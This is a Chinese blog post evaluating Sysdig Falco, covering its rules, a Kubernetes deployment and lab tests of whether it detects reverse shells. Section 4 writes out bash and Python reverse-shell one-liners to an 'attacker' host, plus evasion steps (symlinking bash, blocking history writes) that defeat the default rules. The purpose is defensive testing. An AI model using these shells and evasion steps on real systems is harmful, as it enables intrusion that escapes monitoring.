探索Sysdig Falco：容器环境下的异常行为检测工具

随着容器技术的兴起，容器运行时的安全监控也成为各方关注的焦点。在各行各业积极上云的今天，如何及时准确发现容器内部的安全威胁并进行告警和处置，是容器平台开发运维和应急响应团队必须考虑的问题。

![](http://mmbiz.qpic.cn/mmbiz_jpg/hiayDdhDbxUZBw8Fr0Kd4hDIrXh90icyeL9MliaksMNPibxUUoeHTyRicoPuqD3JG6TFr4TJbHyVT1q0QNNUaTe12xw/0?wx_fmt=jpeg)

](https://mp.weixin.qq.com/s/BAaOREFajQKk3y4MHDgmuA)

## 本文目录

## 摘要

随着容器技术的兴起，容器运行时的安全监控也成为各方关注的焦点。在各行各业积极上云的今天，如何及时准确发现容器环境内部的安全威胁并进行告警和处置，是容器平台开发运维和应急响应团队必须考虑的问题。

Falco是一款为云原生平台设计的进程异常行为检测工具，支持接入系统调用事件和Kubernetes审计日志，与其他工具相比具有独特优势，能够在前述问题上带给我们很多有益思考。本文希望通过两个场景来探索Falco的特性。

### 1.1 什么是Falco？

[Falco](https://sysdig.com/opensource/falco/)是一款由Sysdig开源的进程异常行为检测工具。它既能够检测传统主机上的应用程序，也能够检测容器环境和云平台（主要是Kubernetes和Mesos）。

它能够监控所有涉及系统调用的进程行为。例如：

-   某容器中启动了一个shell
-   某服务进程创建了一个非预期类型的子进程
-   `/etc/shadow`文件被读写
-   `/dev`目录下创建了一个非设备文件
-   `ls`之类的常规系统工具向外进行了对外网络通信

此外，其还可以检测云环境下的特有行为。例如：

-   创建了带有特权容器、挂载敏感路径或使用了宿主机网络的Pod
-   向用户授予大范围权限（例如`cluster-admin`）
-   创建了带有敏感信息的`configmap`

那么，Falco与传统的主机安全监控工具有什么不同呢？

1.  Falco主要依赖于底层Sysdig内核模块提供的系统调用事件流，与用户态工具通过定时采样或轮询方式实现的离散式监控不同，它提供的是一种连续式实时监控功能；
2.  与工作在内核层进行系统调用捕获、过滤和监控的工具相比，Falco自身运行在用户空间，仅仅借助内核模块来获得数据，Falco的规则变更和程序起止要更为灵活；
3.  与其他既工作在内核层又提供用户空间接口的工具相比，Falco具有非常易学的规则语法（可以与SELinux的规则语法对比）和对云环境的支持。

Falco采用`C++`语言编写，但它提供了丰富的告警输出方式（后面会提到），因此能够非常方便地与其他工具协同工作。

### 1.2 程序架构

在进入细节之前，我们希望给出一个“俯瞰”视角，以帮助您建立一个关于Falco的整体概念。

总体来讲，Falco是一个基于规则的进程异常行为检测工具，它目前支持的事件源有两种：

-   Sysdig内核模块
-   Kubernetes审计日志

其中，Sysdig内核模块提供的是整个宿主机上的实时系统调用事件信息，是Falco依赖的核心事件源。

另外，Falco支持五种输出告警的方式：

-   输出到标准输出
-   输出到文件
-   输出到Syslog
-   输出到HTTP服务
-   输出到其他程序（命令行管道方式）

值得一提的是，最后两种方式使得我们能够很容易将Falco与其他组件或框架组合起来。

下图展示了它的基本架构：

![](https://wohin.me/content/images/2019/12/Xnip2019-09-20_20-23-28.jpg)

其中，紫色模块为Falco目前支持的输入事件源，绿色模块为目前支持的输出方式，蓝色模块即Falco用户态程序。

### 1.3 工作原理

Falco采用类似于iptables的规则匹配方式来检测异常。它自带了一份规则文件`/etc/falco/falco_rules.yaml` 供使用，我们也可以将自己定义的规则放在`/etc/falco/falco_rules.local.yaml`文件中。

它的异常检测流程是直观的。以系统调用为例：Sysdig内核模块首先加载，用户态的Falco运行后读取并解析本地配置文件和规则文件、初始化规则引擎；一旦有进程做了系统调用，内核模块将捕获到这次调用，并把详细信息传给Falco，Falco对这些信息作规则匹配，如果满足规则就通过约定好的方式输出告警。上述工作流程可以用下面的流程图表示：

![](https://wohin.me/content/images/2019/12/Xnip2019-09-20_20-24-16.jpg)

### 1.4 规则介绍

Falco的规则使用 `YAML` 描述，一个规则文件（如 `/etc/falco/falco_rules.yaml`）包含三类元素：

-   规则：一条规则是描述“在什么条件下生成什么样的告警”的规定
-   宏：这里宏的意义与C语言中的基本相同，它是一些“判定条件片段”，能够在不同的规则甚至宏中复用
-   列表：即元素集合，能够被规则、宏或者其他列表使用

从层次上来说，基础条件表达式、列表和宏一起构成规则，规则是最直接被Falco用来判断某一行为是否异常的依赖标准。

一条规则至少由以下必需项构成：规则名、条件、描述文字、输出信息和优先级。

下面是一个规则示例：

```
- rule: Terminal shell in container # 规则名：必须是独一无二的名称
  desc: A shell was used as the entrypoint/exec point into a container with an attached terminal. # 描述文字：对规则的详细说明
  condition: > # 条件：用来筛选事件的过滤表达式（Falco采用Sysdig的过滤语法）
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
  output: > # 输出信息：与规则匹配的事件发生时，输出的告警信息
    A shell was spawned in a container with an attached terminal (user=%user.name %container.info
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository)
  priority: NOTICE # 优先级：表示该事件严重程度，是一个枚举项，枚举范围为['emergency', 'alert', 'critical', 'error', 'warning', 'notice', 'informational', 'debug']
  tags: [container, shell, mitre_execution]
```

毫无疑问，一条规则的核心是“条件”，它决定了一个事件是否应该被视作异常行为。在后面几节中，我们将接触并深入分析一些规则。

**更详细的信息请参考[官方文档](https://falco.org/docs/rules/)。**

## 2 部署方法

Falco能够直接部署在物理主机上，也能够以容器方式部署，还能以DaemonSet部署在Kubernetes集群中。

在这里，我们给出手动以DaemonSet方式在Kubernetes集群上部署Falco的过程，其他部署方法可以参考[官方文档](https://falco.org/docs/installation/)。

### 2.1 安装内核头文件

前面提到，Falco依赖于Sysdig内核模块。因此，我们需要在Kubernetes集群的每个节点上安装内核头文件：

```
sudo apt-get install linux-headers-$(uname -r)
```

（注：笔者的Kubernetes测试环境节点使用Ubuntu系统，其他Linux发行版使用等效命令安装即可。）

### 2.2 创建Kubernetes资源

**获取远程仓库：**

```
git clone https://github.com/falcosecurity/falco/
cd falco/integrations/k8s-using-daemonset
```

**创建serviceaccount并提供必要的RABC权限：**

```
kubectl apply -f k8s-with-rbac/falco-account.yaml
```

**创建Falco服务（如果不需要Kubernetes审计日志作为事件源，可以跳过此步骤）：**

```
kubectl apply -f k8s-with-rbac/falco-service.yaml
```

**创建ConfigMap来存储Falco的配置，这样一来我们即使更改配置也不必重新构建、部署pods：**

```
mkdir -p k8s-with-rbac/falco-config
cp ../../falco.yaml k8s-with-rbac/falco-config/
cp ../../rules/falco_rules.* k8s-with-rbac/falco-config/
cp ../../rules/k8s_audit_rules.yaml k8s-with-rbac/falco-config/
```

```
kubectl create configmap falco-config --from-file=k8s-with-rbac/falco-config
```

**创建DaemonSet：**

```
kubectl apply -f k8s-with-rbac/falco-daemonset-configmap.yaml
```

### 2.3 测试

**获取pod日志：**

```
kubectl logs -l app=falco-example
```

**日志显示Falco已经正常运行：**

```
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
Thu Sep 19 02:09:44 2019: Falco initialized with configuration file /etc/falco/falco.yaml
Thu Sep 19 02:09:44 2019: Loading rules from file /etc/falco/falco_rules.yaml:
Thu Sep 19 02:09:44 2019: Loading rules from file /etc/falco/falco_rules.local.yaml:
Thu Sep 19 02:09:44 2019: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
Thu Sep 19 02:09:45 2019: Starting internal webserver, listening on port 8765
02:09:45.241612000: Notice Privileged container started (user=root command=container:0b07c858a9a0 k8s.ns=default k8s.pod=falco-daemonset-hgbp9 container=0b07c858a9a0 image=falcosecurity/falco:0.17.0) k8s.ns=default k8s.pod=falco-daemonset-hgbp9 container=0b07c858a9a0
```

## 3\. “Hello,world”之检测容器内创建Shell

在部署完成后，Falco已经提供了一个现成的规则文件 `/etc/falco/falco_rules.yaml` 供我们使用。这里我们借助一个简单的场景来体验Falco的功能：容器中启动一个shell，Falco检测出这个异常行为。

### 3.1 测试

测试环境是拥有两个节点的Kubernetes，Falco以DaemonSet形式部署在上面：

![](https://wohin.me/content/images/2019/12/WeChat-Work-Screenshot_20190916110106.png)

首先，我们连接到某个falco pod上（这里我们连接到master节点上的pod）：

```
kubectl attach falco-daemonset-77gct
```

Master节点上事先已经运行了一个ubuntu容器，现在我们尝试在这个容器里打开一个shell：

```
docker exec -it b769 /bin/bash
```

从下图中可以看到，在shell打开的同时，falco就给出了告警提示：

![](https://wohin.me/content/images/2019/12/WXWorkCapture_15686031784812.png)

### 3.2 规则分析

下面，我们来看一看这一切是如何发生的：

首先从 `/etc/falco/falco_rules.yaml` 中找到被触发的检测规则：

```
- rule: Terminal shell in container
  desc: A shell was used as the entrypoint/exec point into a container with an attached terminal.
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
  output: >
    A shell was spawned in a container with an attached terminal (user=%user.name %container.info
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository)
  priority: NOTICE
  tags: [container, shell, mitre_execution]
```

```
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
```

其中，`spawned_process`、`container` 和 `shell_procs` 及 `container_entrypoint` 是四个宏，我们同样可以在 `/etc/falco/falco_rules.yaml` 中找到它们：

```
- list: shell_binaries
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]
- macro: spawned_process
  condition: evt.type = execve and evt.dir=<
- macro: container
  condition: (container.id != host)
- macro: shell_procs
  condition: proc.name in (shell_binaries)
- macro: container_entrypoint
  condition: (not proc.pname exists or proc.pname in (runc:[0:PARENT], runc:[1:CHILD], runc, docker-runc, exe))
```

综合上述信息，我们可以将该规则“翻译”为如下语言：

如果一个事件指明“在某容器中”启动了一个“新进程”，进程名是“常见shell的名称”，分配“有终端”且角色为“容器入口进程”，那么该事件被判定为`notice`级别的异常，一个告警将被输出。

最终，我们得到这样一个告警信息：

```
03:04:49.103073119: Notice A shell was spawned in a container with an attached terminal (user=root k8s.ns=<NA> k8s.pod=<NA> container=b769d5606d87 shell=bash parent=runc cmdline=bash terminal=34817 container_id=b769d5606d87 image=ubuntu) k8s.ns=<NA> k8s.pod=<NA> container=b769d5606d87
```

## 4\. “Hello,world”之对抗反弹Shell

在做了以上初步尝试后，笔者不满足于这种简单的场景，希望能够在有意义的场景下探索Falco，从而更好地体会它的优势与不足。

我们知道，常见的攻击往往从Web服务入手：攻击者首先收集各种信息，进行各种测试，然后借助注入或文件上传等手段拿到Webshell，接着通常会利用Webshell来反弹一个真正的shell（考虑到传统内网防火墙拦进不拦出的特性，反弹shell要比监听shell可用性更高）到自己控制的机器，最终利用这个shell进行权限提升、横向渗透、访问维持和痕迹清理等后渗透阶段的活动。

**因此，“反弹shell”往往在整个攻击过程中起到非常重要的作用。那么，Falco能否用来检测反弹shell的建立呢？**

在第一节中，Falco现有规则已经能够检测到容器中入口进程执行shell的情况。其实我们只需要对该规则的条件做一点改动，就能够实现本节的目的：

```
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
```

具体而言，我们依然使用 `/etc/falco/falco_rules.yaml` 作为规则文件，只是删去了其中“Terminal shell in container”这一规则的“shell必须作为容器入口进程”限制。

### 4.1 第一次测试

现在来试一下！

为了方便调试，本节我们采用直接在master上安装运行Falco的方式。我们将开启三个终端窗口：

![](https://wohin.me/content/images/2019/12/5A5A74EA-71D3-4CD9-8EF2-641665D3088F.png)

其中，右下方是falco终端，用来在master上运行falco；上方的是victim终端，用来模拟攻击者建立反弹shell的操作；左下方是attacker终端，用来监听反弹shell请求。

首先，我们在attacker终端中开启监听：

```
ncat -l -p 10000
```

在falco终端启动检测：

```
falco
```

接着，在victim终端创建常用的反弹shell：

```
bash -i >& /dev/tcp/attacker/10000 0>&1
```

攻击者在attacker终端成功获得了反弹shell，然而，falco终端给出了两条告警：

![](https://wohin.me/content/images/2019/12/1CF45D22-5BAD-442D-9EA8-CDFAD47E5CCB.png)

告警分别为：

-   检测到系统程序接收/发送了网络流量
-   检测到容器内开启了一个shell

### 4.2 第一次绕过

**好了，看来借助Falco来检测反弹shell至少是可行的。那么，攻击者是否能够绕过上面的检测呢？**

我们来分析一下情况。

第一个告警在第一节中没有出现过，但的确也是基于 `/etc/falco/falco_rules.yaml` 中的规则生成的：

```
- rule: System procs network activity
  desc: any network activity performed by system binaries that are not expected to send or receive any network traffic
  condition: >
    (fd.sockfamily = ip and (system_procs or proc.name in (shell_binaries)))
    and (inbound_outbound)
    and not proc.name in (systemd, hostid, id)
    and not login_doing_dns_lookup
  output: >
    Known system binary sent/received network traffic
    (user=%user.name command=%proc.cmdline connection=%fd.name container_id=%container.id image=%container.image.repository)
  priority: NOTICE
  tags: [network, mitre_exfiltration]
```

相关的宏和列表如下：

```
- macro: system_procs
  condition: proc.name in (coreutils_binaries, user_mgmt_binaries)
- list: shell_binaries
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]
- macro: inbound_outbound
  condition: >
    (((evt.type in (accept,listen,connect) and evt.dir=<)) or
     (fd.typechar = 4 or fd.typechar = 6) and
     (fd.ip != "0.0.0.0" and fd.net != "127.0.0.0/8") and
     (evt.rawres >= 0 or evt.res = EINPROGRESS))
- list: coreutils_binaries
  items: [
    truncate, sha1sum, numfmt, fmt, fold, uniq, cut, who,
    groups, csplit, sort, expand, printf, printenv, unlink, tee, chcon, stat,
    basename, split, nice, "yes", whoami, sha224sum, hostid, users, stdbuf,
    base64, unexpand, cksum, od, paste, nproc, pathchk, sha256sum, wc, test,
    comm, arch, du, factor, sha512sum, md5sum, tr, runcon, env, dirname,
    tsort, join, shuf, install, logname, pinky, nohup, expr, pr, tty, timeout,
    tail, "[", seq, sha384sum, nl, head, id, mkfifo, sum, dircolors, ptx, shred,
    tac, link, chroot, vdir, chown, touch, ls, dd, uname, "true", pwd, date,
    chgrp, chmod, mktemp, cat, mknod, sync, ln, "false", rm, mv, cp, echo,
    readlink, sleep, stty, mkdir, df, dir, rmdir, touch
    ]
- list: user_mgmt_binaries
  items: [login_binaries, passwd_binaries, shadowutils_binaries]
- list: login_binaries
  items: [
    login, systemd, '"(systemd)"', systemd-logind, su,
    nologin, faillog, lastlog, newgrp, sg
    ]
- list: passwd_binaries
  items: [
    shadowconfig, grpck, pwunconv, grpconv, pwck,
    groupmod, vipw, pwconv, useradd, newusers, cppw, chpasswd, usermod,
    groupadd, groupdel, grpunconv, chgpasswd, userdel, chage, chsh,
    gpasswd, chfn, expiry, passwd, vigr, cpgr, adduser, addgroup, deluser, delgroup
    ]
- list: shadowutils_binaries
  items: [
    chage, gpasswd, lastlog, newgrp, sg, adduser, deluser, chpasswd,
    groupadd, groupdel, addgroup, delgroup, groupmems, groupmod, grpck, grpconv, grpunconv,
    newusers, pwck, pwconv, pwunconv, useradd, userdel, usermod, vigr, vipw, unix_chkpwd
    ]
```

仔细思考后发现，第一条规则的条件中比较容易突破的点是 `(system_procs or proc.name in (shell_binaries)))`。我们可以将上面的列表理解为黑名单，那么如果要绕过第一条规则，只需要采用一种不在黑名单上的方式即可，例如借助Python来建立反弹shell：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 4.3 第二次测试

执行上述命令，攻击者再次获得了shell，可以看到，告警也只有一条关于shell的了：

![](https://wohin.me/content/images/2019/12/C72DF27F-6473-4A04-AC77-5F31C326B6DD.png)

### 4.4 第二次绕过

那么，如何绕过剩下这个告警呢？思路是类似的，我们只需要使用黑名单之外的shell即可（上面的Python代码实质上调用了`/bin/sh`）。然而，规则文件中shell列表基本上把常见shell都包含进去了：`[ash, bash, csh, ksh, sh, tcsh, zsh, dash]`，想再找出一个其他的shell，不太容易。因此，我们考虑别的思路。例如，可以尝试软链接的方式变相为shell改名(普通用户权限不能直接修改 `/bin/sh` 的文件名；另外，为了规避可能发生的动态链接问题我们也不借助拷贝来实现改名，事实上这样也是可行的)：

```
ln -s /bin/bash /tmp/fake_bash
```

将前面的反弹shell中的`/bin/sh`替换掉：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/tmp/fake_bash","-i"]);'
```

### 4.5 第三次测试

执行上述命令，攻击者又获得了shell :)，而且这次Falco没有任何告警：

![](https://wohin.me/content/images/2019/12/DCB8BC1F-60A6-47E2-B7D4-2994448E37AE.png)

### 4.6 触发隐藏剧情

虽然表面上看起来没有任何告警被触发，但是新的问题会出现：当攻击者在反弹shell中执行过命令然后退出时，当前shell会自动向 `~/.bash_history` 文件写入执行过的命令历史记录，这个操作同样会触发告警：

![](https://wohin.me/content/images/2019/12/B591998C-87E3-4C15-8503-8601510E1F68-1.png)

我们看一下原因，同样从 `/etc/falco/falco_rules.yaml` 文件中找到相应规则：

```
- rule: Modify Shell Configuration File
  desc: Detect attempt to modify shell configuration files
  condition: >
    open_write and
    (fd.filename in (shell_config_filenames) or
     fd.name in (shell_config_files) or
     fd.directory in (shell_config_directories)) and
    not proc.name in (shell_binaries)
  output: >
    a shell configuration file has been modified (user=%user.name command=%proc.cmdline file=%fd.name container_id=%container.id image=%container.image.repository)
  priority:
    WARNING
  tag: [file, mitre_persistence]
```

逻辑很简单，我们不再给出相应的宏和列表。原因也很简单：`~/.bash_history` 一定是被监控的shell配置文件之一。

知道了原因，我们也有了绕过方案。一种比较取巧的方式是，直接限制用户自己对 `~/.bash_history` 文件的写入：

```
chmod u-w ~/.bash_history
```

先执行上述命令，再使用上面给出的Python+软链接方式创建反弹shell，整个过程终于不再触发任何告警：

![](https://wohin.me/content/images/2019/12/02D93E5D-951A-4BA2-802B-246C12A253C1.png)

## 5\. 总结

从前面的实验中两次绕过来看，似乎Falco的自带规则并不十分准确。在实验中，我们尽量减少对Falco自带规则文件的修改，正是为了尽可能模拟真实场景，探索这么做会带来什么问题。现实中，许多开发、运维人员常常不去修改默认配置或文件，认为配备了安全防护设施后就可以高枕无忧。然而，许多安全事故正是来自这些看似不起眼的地方。无论多么先进的技术，只有融入到具体情况千差万别的生产环境中，安全运营团队持续地采用多种检测手段交叉验证、形成闭环，才能真正有效发挥作用。

另外，笔者认为，作为一种适用于云环境的“无状态”的“系统调用级别”实时异常行为检测工具，Falco提供了稳定可信的原子异常事件序列，这已足够。

诚然，我们可以根据具体生产环境的特点去构建更复杂、严格的检测规则，使规则更难被绕过，但是随着时间的推移和攻击技术的发展，这样的检测规则势必会陷入“过度拟合”的状态，难于维护和进化，难免百密一疏。

也许，一个更优雅灵活的防护机制是，将Falco作为底层异常事件源，在其上应用异常检测算法构建出一套“有状态”的异常检测系统。这样的系统能够从异常事件序列中解读出更高层次的攻击行为，且易于维护和进化：在大部分情况下，我们只需要修改上层检测模型，使之适应当前环境即可。

## 6\. 参考文献

-   [Falco官方文档](https://falco.org/docs/)
-   [SELinux, Seccomp, Sysdig Falco, and you: A technical discussion](https://sysdig.com/blog/selinux-seccomp-falco-technical-discussion)

## 7\. 拓展阅读

-   [How to identify malicious IP activity using Falco](https://sysdig.com/blog/how-to-identify-malicious-ip-activity-using-falco/)
-   [How to detect Kubernetes vulnerability CVE-2019-11246 using Falco.](https://sysdig.com/blog/how-to-detect-kubernetes-vulnerability-cve-2019-11246-using-falco/)
-   [High Interaction Honeypots with Sysdig and Falco](https://labs.mwrinfosecurity.com/blog/high-interaction-honeypots-with-sysdig-and-falco/)

![](https://wohin.me/content/images/2020/07/support_.png)